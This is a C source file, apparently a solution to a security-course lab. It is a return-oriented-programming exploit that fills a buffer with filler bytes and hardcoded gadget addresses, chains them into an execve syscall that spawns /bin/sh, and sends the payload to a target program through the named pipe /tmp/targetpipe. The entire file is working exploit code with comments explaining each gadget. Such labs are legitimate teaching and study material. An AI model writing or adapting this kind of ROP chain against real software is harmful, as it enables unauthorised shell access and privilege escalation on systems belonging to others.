#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  char bufr[200];
  // bufr address = bfbf57e5
  char null_arg_addr[] = "\x8c\x58\xbf\xbf";
  char shell_addr[] = "\x9c\x58\xbf\xbf";
  char prev_addr[] = "\x90\x58\xbf\xbf";

  char trap[] = "\xe5\xb6\xa9\xbb";
  char xor_eax[] = "\xc2\xb3\xa9\xbb";
  char pop_eax[] = "\xe1\xa0\xb9\xbb";
  char xor_edx[] = "\xd4\xbe\xb3\xbb";
  char pop_edx[] = "\x1b\xdc\xb9\xbb";
  char pop_ecx[] = "\x22\xa4\xba\xbb";
  char add_dl_al[] = "\x07\x46\xbb\xbb";
  char write_at_ecx_from_edx[] = "\x7e\xb8\x6b\xbb"; 

  char exec_arg[] = "\x3b\x01\x01\x01";

  int i;
  // Fill up buffer
  for(i = 0; i < 131; i++)
    memcpy(bufr + i, "\x01",1);

  // overwrite ebp
  // pop arg into edx
  strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
  strcpy(bufr + 135, exec_arg);
  // clear eax
  strcpy(bufr + 139, xor_eax); // 0xbba9b3c2
  // add last 8 bits of edx to eax
  strcpy(bufr + 143, add_dl_al); // 0xbbbb4607
                                 // eax now holds 0x3b (59)
  // clear edx 
  strcpy(bufr + 147, xor_edx); // 0xbbb3bed4
  // pop null args address into ecx
  strcpy(bufr + 151, pop_ecx); // 0xbbbaa422
  strcpy(bufr + 155, null_arg_addr); // = 0xbfbf588c
  // write 4 bytes of null to address in ecx
  strcpy(bufr + 159, write_at_ecx_from_edx); // 0xbbb6b87e
                                             // null arg should be present
  // trap into kernel
  strcpy(bufr + 163, trap); // 0xbba9b6e5
  // leave 4 bytes for the ret call of trap
  strcpy(bufr + 167, "\x01\x01\x01\x01");
  // address of "/bin/sh"
  strcpy(bufr + 171, shell_addr);
  // address of prev arg
  strcpy(bufr + 175, prev_addr);
  // leave 4 bytes for null arg at bufr + 179
  strcpy(bufr + 179, "\x01\x01\x01\x01");
  // location of "/bin/sh" bufr + 183
  strcpy(bufr + 183, "/bin/sh");

  writecmd(PIPEPATH, bufr);
  
  return 0;
}
// esp: 0xbfbf57d8 -> 08048be8
// buf: 0xbfbf57e5